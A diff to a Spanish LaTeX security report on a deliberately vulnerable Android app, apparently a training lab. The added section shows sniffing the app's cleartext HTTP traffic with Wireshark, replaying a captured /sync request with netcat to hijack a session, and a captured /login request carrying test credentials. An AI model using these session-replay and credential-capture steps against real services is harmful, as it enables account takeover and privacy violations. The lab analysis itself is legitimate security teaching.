@@ -23,6 +23,7 @@
 \index{Vulnerabilidades Locales}
 \section{Vulnerabilidades Locales}
 \subsection{Datos mal protegidos}
+\subsection{Componentes mal exportados}
 \subsubsection{Descripción}
 A partir de esta vulnerabilidad, una aplicación maliciosa podría 
 acceder a los datos sensibles del usuario. 
@@ -73,16 +74,100 @@ $ adb shell content query --uri "content://ar.sadosky.browser.history_provider/h
 Row: 0 url_visited=about:blank
 \end{verbatim}
 
-\subsection{Componentes mal exportados}
-
 %
 %-- Sección: Vulnerabilidades de Red
 %
 \clearpage
 \index{Vulnerabilidades de Red}
 \section{Vulnerabilidades de Red}
-\subsection{Activo}
 \subsection{Pasivo}
+\subsubsection{Descripción}
+El tráfico de la aplicación BadBrowser es enviado a través del protocolo HTTP. Esto significa que el mismo puede ser interceptado por un analizador de protocolos/tráfico de red. 
+
+\subsubsection{Captura de tráfico}
+Se utilizó \textbf{``Wireshark''}\footnote{\url{https://www.wireshark.org/}}, aplicando el filtro \texttt{``ip.dst==192.168.0.103 and tcp.dstport==8888''} (en donde \texttt{192.168.0.103} es la IP del servidor) para realizar un análisis dinámico que nos permitiese deducir los pormenores de la comunicación aplicación-servidor, tratando a ambos como \emph{cajas negras}. Se muestran los resultados obtenidos en \fig{wireshark-filtro}.
+
+\begin{center}
+\begin{figure}[H]
+\includegraphics[width=\textwidth]{wireshark-filtro.png}
+\caption{Wireshark con filtros}
+\label{fig:wireshark-filtro}
+\end{figure}
+\end{center}
+
+A través de la opción \texttt{Follow TCP Stream}, es posible ver e interpretar el contenido del tráfico interceptado, de forma que pueda ser visto, por ejemplo, codificado en ASCII, o en Hexadecimal. En \fig{wireshark-followstream} es posible observar el resultado de este análisis.
+
+\begin{figure}[H]
+\begin{center}
+\includegraphics[width=0.7\textwidth]{wireshark-followstream.png}
+\end{center}
+\caption{Ejemplo transcripción del tráfico HTTP interceptado}
+\label{fig:wireshark-followstream}
+\end{figure}
+
+\subsubsection{Robo de sesión}
+Con el tráfico capturado, podemos realizar la misma petición desde una PC distinta al cliente original. Utilizando el comando \texttt{netcat}, se envió una copia del tráfico capturado al servidor. El resultado de esta prueba se puede observar en \fig{sync-simulado1} y \fig{sync-simulado2}, en donde se transcribieron el request y la respuesta recibida, respectivamente.
+
+\begin{figure}[H]
+\begin{Verbatim}[frame=single,fontsize=\small]
+$ nc 192.168.0.103 8888
+POST /sync?email=test2%40test.com&session_key=q%2BlY0j%2FmskTx4GC%2F73sgkg%3D%3D HTTP/1.1
+Content-Type: application/json; charset=UTF-8
+User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.2; sdk Build/MASTER)
+Host: 192.168.0.103:8888
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 27
+
+["YWJvdXQ6Ymxhbms\u003d\n"]
+\end{Verbatim}
+\caption{Simulamos un request \textbf{{\color{red}/sync}} desde otra PC}
+\label{fig:sync-simulado1}
+\end{figure}
+
+\begin{figure}[H]
+\begin{Verbatim}[frame=single,fontsize=\small]
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/2.7.6
+Date: Sun, 22 Feb 2015 20:41:00 GMT
+\end{Verbatim}
+\caption{Respuesta obtenida en el cliente luego de hacer el request}
+\label{fig:sync-simulado2}
+\end{figure}
+
+\begin{figure}[H]
+\begin{Verbatim}[frame=single,fontsize=\small]
+192.168.0.103 - - [22/Feb/2015 17:40:58] "POST /sync?email=test2%40test.com
+&session_key=q%2BlY0j%2FmskTx4GC%2F73sgkg%3D%3D HTTP/1.1" 200 -
+192.168.0.8 - - [22/Feb/2015 17:41:00] "POST /sync?email=test2%40test.com
+&session_key=q%2BlY0j%2FmskTx4GC%2F73sgkg%3D%3D HTTP/1.1" 200 -
+\end{Verbatim}
+\caption{Output producido en el servidor de python luego del request}
+\label{fig:sync-simulado3}
+\end{figure}
+
+Además, en \fig{sync-simulado3} podemos apreciar el output producido en la consola del servidor, en donde figuran ambos requests, el original producido por el cliente de android (\textbf{IP 192.168.0.103}), y el fraudulento, producido por la \textbf{IP 192.168.0.8}. Ambos son respondidos con un HTTP 200, lo que significa que las sesiones no recuerdan la IP desde la que fueron producidas, lo que en este caso nos permite robar una sesión, simplemente capturando su \texttt{session\_key}. Es decir, hacernos pasar por el usuario, con todas las implicancias que eso conlleva.
+
+\subsubsection{Adicional: Robo de credenciales (password)}
+Además de poder secuestrar la sesión de un usuario, si logramos capturar un request /login, entonces vamos a poder desencriptar la password del usuario.
+
+\begin{figure}[H]
+\begin{Verbatim}[frame=single,fontsize=\small]
+POST /login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.2; sdk Build/MASTER)
+Host: 192.168.0.103:8888
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 86
+
+email=test2%40test.com&password=wmw%2Ba1kdbW5UIt3Dg1fesg%3D%3D%0A&uuid=000000000000000
+\end{Verbatim}
+\caption{Request \textbf{\color{red}/login} del cliente BadBrowser}
+\label{fig:sniffer-login}
+\end{figure}
+
+\subsection{Activo}
 
 %
 %-- Sección: Vulnerabilidades Remotas
